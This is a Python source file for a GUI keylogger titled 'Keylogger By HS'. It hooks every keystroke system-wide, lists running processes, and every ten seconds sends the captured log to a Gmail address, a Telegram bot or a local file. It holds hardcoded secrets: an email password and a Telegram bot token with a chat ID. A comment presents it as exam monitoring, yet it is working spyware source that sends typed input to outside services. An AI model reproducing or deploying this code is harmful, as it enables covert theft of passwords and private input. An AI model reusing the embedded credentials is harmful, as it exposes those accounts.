from ast import Or
from cProfile import label
from concurrent.futures import process
from glob import glob
from tkinter import commondialog
from tkinter.tix import ButtonBox
from turtle import width
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
import threading
import requests
import time
import tkinter.ttk
import sys
import wmi
from datetime import datetime
import os
import tkinter as tk
from tkinter import *
from tkinter import filedialog
from PIL import ImageTk, Image
from email.mime.multipart import MIMEMultipart
from tkinter import ttk, messagebox
from email.mime.text import MIMEText
import psutil
import re
import base64
from email.mime.text import MIMEText
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from requests import HTTPError

SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on , for online exam purpose, you may set duration according to exam time.
EMAIL_ADDRESS = "keylogprojecttester@gmail.com"
EMAIL_PASSWORD = "Keylog123"
check_preference = ""
regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
correct_password = "password" 
__location__ = os.path.realpath(
    os.path.join(os.getcwd(), os.path.dirname(__file__)))

window = tk.Tk()
window.grid_columnconfigure((0, 4), weight=1)
# Add a label widget
window.title('Keylogger By HS')
window.geometry("400x150+100+100")
photo = PhotoImage(file = "logo.png")
window.iconphoto(False, photo)

frame1 = tk.Frame(window)
separator = ttk.Separator(window, orient='vertical')
frame2 = tk.Frame(window)

#Create a canvas
canvas= Canvas(frame1, width= 150, height= 50)
canvas.grid(row=0, column=0)

#Load an image in the script
img= (Image.open("banner.png"))

#Resize the Image using resize method
resized_image= img.resize((123,37), Image.ADAPTIVE)
new_image= ImageTk.PhotoImage(resized_image)

#Add image to the Canvas Items
canvas.create_image(75, 25, anchor=CENTER, image=new_image)


class Keylogger:
    def __init__(self, interval, report_method="email"):

        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""

        # Processes
        # Initializing the wmi constructor
        self.f = wmi.WMI()

        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.stop_flag = False

    def get_process_list(self):
        """Returns a string with a list of all the running processes."""
        processlist=list()

        for process in psutil.process_iter():
            processlist.append(process.name())
            
        return ', '.join(processlist)


    def stop(self):
        self.start_dt = datetime.now()
        self.stop_flag = True
        print(f"{datetime.now()} - Stopped keylogger")

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
         # check the stop flag
        if self.stop_flag:
            return
    
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n" 
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                    
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
        
    def report_to_file(self):
        newdir = label_path.cget("text")
        process_lists = self.get_process_list()
        alltext = "Keylog Captured :" + os.linesep + self.log + os.linesep + os.linesep + "Processes :" +os.linesep + process_lists
        
        if not newdir:
            print(f"Current working directory: {os.getcwd()}")
            try: 
                 # open the file in write mode (create it)
                 with open(f"{self.filename}.txt", "w") as f:
                    # write the keylogs to the file
                    

                    print(alltext, file=f)
                 print(f"[+] Saved {self.filename}.txt")
            except Exception as e:
                 print(f"An error occurred while trying to save the file: {e}")
                 
        else: 
            print(f"Current working directory: {newdir}")
            
            try: 
                 # open the file in write mode (create it)
                with open(os.path.join(newdir, self.filename+".txt"), "w") as f:
                   # write the keylogs to the file
                   
                   print(alltext, file=f)
                print(f"[+] Saved {self.filename}.txt")
            except Exception as e:
                print(f"An error occurred while trying to save the file: {e}")
                
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
       

    def send_email(self, to, subject, body):
      SCOPES = [
        "https://www.googleapis.com/auth/gmail.send"
       ]
      flow = InstalledAppFlow.from_client_secrets_file(
                os.path.join(__location__, 'credentials.json'), SCOPES)
      creds = flow.run_local_server(port=0)
      service = build('gmail', 'v1', credentials=creds)
      message = MIMEText(body)
      message['to'] = to
      message['subject'] = subject
      create_message = {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}
      try:
          message = (service.users().messages().send(userId="me", body=create_message).execute())
          print(F'sent message to {message} Message Id: {message["id"]}')
      except HTTPError as error:
          print(F'An error occurred: {error}')
          message = None
  
    def send_to_telegram(self, message):

        apiToken = '5781145400:AAEikEethWmWas9bW4DJNJtfTPLk_oqi_wA'
        chatID = '740927781'
        apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'

        try:
            response = requests.post(apiURL, json={'chat_id': chatID, 'text': message})
            print(response.text)
        except Exception as e:
            print(e)

    
       

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            global check_preference
            global Button1
            global Button2
          

            if self.report_method == "file":

                self.report_to_file()

            elif self.report_method == "send_gmail":

                processes = self.get_process_list()

                alltext = "Keylog Captured :" + os.linesep + self.log + os.linesep + os.linesep + "Processes :" +os.linesep +processes

                self.send_email(EMAIL_ADDRESS, "Keylog Report", alltext)

            elif self.report_method == "telegram":

                self.send_to_telegram(self.log)

            elif self.report_method == "send_gmailANDfile":
                self.report_to_file()
                processes = self.get_process_list()

                alltext = "Keylog Captured :" + os.linesep + self.log + os.linesep + os.linesep + "Processes :" +os.linesep +processes

                self.send_email(EMAIL_ADDRESS, "Keylog Report", alltext)

            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()

        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()
      
#TODO CHECK_PREFERENCE NOT WORKING, GIVING EMPTY RESULT
if len(check_preference) == 0:
    
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="send_gmail")
else:
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method=check_preference)
    
print(check_preference)    

def check_password():
    # retrieve the password that the user entered
    password = entry.get()
    # check if it is correct
    if password == correct_password:
        # if the password is correct, destroy the window
        label.grid_forget()
        buttonStart.grid(row=4, column=0, padx=10, pady=10)
        buttonSettings.grid(row=5, column=0)
        # text_box.grid(row = 5, column=1)
        button.grid_forget()
        entry.grid_forget()
        messagebox.showinfo("Success", "Success login !")
        

    else:
        # if the password is incorrect, display an error message
        label.config(text="Incorrect password. Try again.")
        buttonStart.grid_forget()
        # scrollbar.grid_forget()
        # text_box.grid_forget()
        messagebox.showinfo("Failed", "Wrong password !")
    
def start_blocking_function():
    # create a new thread and run the blocking function in it
    thread = threading.Thread(target=keylogger.start)

    global flag
    if flag:
        # stop the function
        flag = False
        # change the text of the button to "Start"
        buttonStart.configure(text="Start")
        time.sleep(5)
        keylogger.stop()

    else:
        # start the function
        flag = True
        # change the text of the button to "Stop"
        buttonStart.configure(text="Stop")
        
        thread.start()
    window.update

def showSettings():

    
    frame2.grid(column=1, row=0, padx=10, pady=10)
    separator.grid(column=0, row=0, sticky='nse')

    labelChangePass.grid(row=0, column=1, padx=5, pady=5)
    entrylabelChangePass.grid(row=1, column=1)
    
    labelChangeEmail.grid(row=2, column=1, padx=5, pady=5)
    entryChangeEmail.grid(row=3, column=1)
    
    setFileLocation.grid(row=4, column=1, padx=5, pady=5)
    openFileButton.grid(row=5, column=1, padx=5, pady=5)
    
    confirm_settings.grid(row=7, column=1, padx=5, pady=5)
    Button1.grid(row=0, column=2)
    Button2.grid(row=1, column=2)
    
flag = False

def confirmSettings():
    global check_preference
    global Checkbutton1
    global Checkbutton2

    if entrylabelChangePass.get():
        global correct_password 
        correct_password = entrylabelChangePass.get()
        messagebox.showinfo("Success", "Password Changed !")
        
    elif entryChangeEmail.get():
        global EMAIL_ADDRESS
        EMAIL_ADDRESS = entryChangeEmail.get()
        if(re.fullmatch(regex, EMAIL_ADDRESS)):
           print("Valid")
           messagebox.showinfo("Success", "Email Changed !")

        else:
           print("Invalid")
           messagebox.showinfo("Failed", "Please input valid email !")
          
    elif Checkbutton1.get() == 1:
        check_preference = "send_gmail"
        messagebox.showinfo("Success", "Email !")
    elif Checkbutton2.get() == 1:
        check_preference = "file"
        messagebox.showinfo("Success", "File !")

        #TODO FIX IF BOTH CHECKED

    elif Checkbutton1.get() == 1 and Checkbutton2.get() == 1:
        check_preference = "send_gmailANDfile"
        messagebox.showinfo("Success", "Email and File !")

    print(check_preference)
           

        
def openDirectory():
     filepath=filedialog.askdirectory(initialdir=r"C:\Users",
                                    title="Select directory")
     
     label_path.grid(row=6, column=1, padx=5, pady=5)
     label_path.config(text=filepath)

# 

frame1.grid(column=0, row=0)


label = tk.Label(frame1, text="Enter your password  : ")
label.grid(row=1, column=0)

entry = tk.Entry(frame1, width='30')
entry.grid(row=2, column=0)

button = tk.Button(frame1, text="Submit", command=check_password, fg="black")
button.grid(row=3, column=0, padx=10, pady=10)

# retrieve the text that the user entered
text = entry.get()

buttonStart = tk.Button(frame1, text="Start", command=start_blocking_function)
buttonSettings = tk.Button(frame1, text="Settings", command=showSettings)

labelChangePass = tk.Label(frame2, text="Change Password")
entrylabelChangePass = tk.Entry(frame2, width='30')
labelChangeEmail = tk.Label(frame2, text="Change Receiving Email")
entryChangeEmail = tk.Entry(frame2, width='30')
setFileLocation = tk.Label(frame2, text="File Location")
openFileButton = tk.Button(frame2, text="Select Location", command=openDirectory)
label_path = tk.Label(frame2, text = "")

confirm_settings = tk.Button(frame2, text="Confirm", command=confirmSettings)

Checkbutton1 = IntVar()  
Checkbutton2 = IntVar()  

Button1 = Checkbutton(window, text = "Email", 
                      variable = Checkbutton1,
                      onvalue = 1,
                      offvalue = 0,
                      height = 2,
                      width = 10)
  
Button2 = Checkbutton(window, text = "File",
                      variable = Checkbutton2,
                      onvalue = 1,
                      offvalue = 0,
                      height = 2,
                      width = 10)

#text_box = tk.Text(window, width='30', height='10')

# create a scrollbar
# scrollbar = tk.Scrollbar(text_box)

# associate the scrollbar with the text box
# text_box.config(yscrollcommand=scrollbar.set)
# scrollbar.config(command=text_box.yview)

# Run the Tkinter event loop
window.mainloop() 

